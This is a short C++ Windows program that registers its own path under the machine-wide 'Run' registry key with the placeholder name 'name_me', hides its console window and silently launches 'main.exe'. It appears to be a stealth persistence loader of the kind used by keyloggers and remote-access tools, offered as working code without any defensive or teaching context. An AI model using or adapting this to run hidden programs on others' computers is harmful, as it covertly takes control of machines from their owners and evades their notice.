#define _WIN32_WINNT 0x0500
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <iostream>

int main()
{
  // Run program on startup
  TCHAR szPath[MAX_PATH];
  GetModuleFileName(NULL,szPath,MAX_PATH);
  HKEY newValue;
  RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
  RegSetValueEx(newValue,"name_me",0,REG_SZ,(LPBYTE)szPath,sizeof(szPath));
  RegCloseKey(newValue);

  // Hide Console
  HWND hWnd = GetConsoleWindow();
  ShowWindow( hWnd, SW_HIDE );

  // Launch the program
  (void)system("main.exe");
  return(0);

}
